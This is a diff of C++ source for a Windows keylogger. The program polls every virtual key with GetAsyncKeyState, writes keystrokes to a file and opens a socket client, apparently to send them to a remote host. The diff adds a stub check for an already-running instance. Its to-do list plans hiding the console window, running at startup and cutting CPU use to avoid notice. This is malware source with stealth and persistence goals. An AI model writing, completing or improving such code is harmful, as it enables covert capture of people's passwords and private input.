@@ -20,6 +20,12 @@
 #include <thread>
 #include <winsock2.h>
 
+int isProcRunning() 
+{
+    //EnumProcesses(&x, sizeof(std::vector), )
+    return 0;
+}
+
 void writeKeyStroke(int trueKey, SOCKET sObjC)
 {
     std::ofstream file;
@@ -43,13 +49,13 @@ void writeKeyStroke(int trueKey, SOCKET sObjC)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
-    FreeConsole();
-    SOCKET sObjClient = initClient();
+    isProcRunning();
     Maps vkMaps;
+    SOCKET sObjClient = initClient();
     vkMaps.initializeMaps();
     while (true)
     {
-        for (int i = 1; i < 254; i++)
+        for (int i = 1; i < 254; i++) 
         {
             int key = GetAsyncKeyState(i);
             int dontLogShiftKey = (i != 16 && i != 160 && i != 161);
@@ -92,10 +98,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
 
         To-Do list
-    ~ hide console window on w10, and w11 machines. 
+    ~ create a function to check if the code program is already running. 
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
-    ~ implement code algorithm to check if user is idle, if so then exit the loop and wait til mouse moves. 
+    ~ implement code algorithm to check if user is idle, if so then exit the loop and wait til mouse moves.
+    ~ find a way to decrease cpu usage. 
 
         Ideas
     ~ implement code to check if user is idle, if so then exit the loop and wait til mouse moves. 
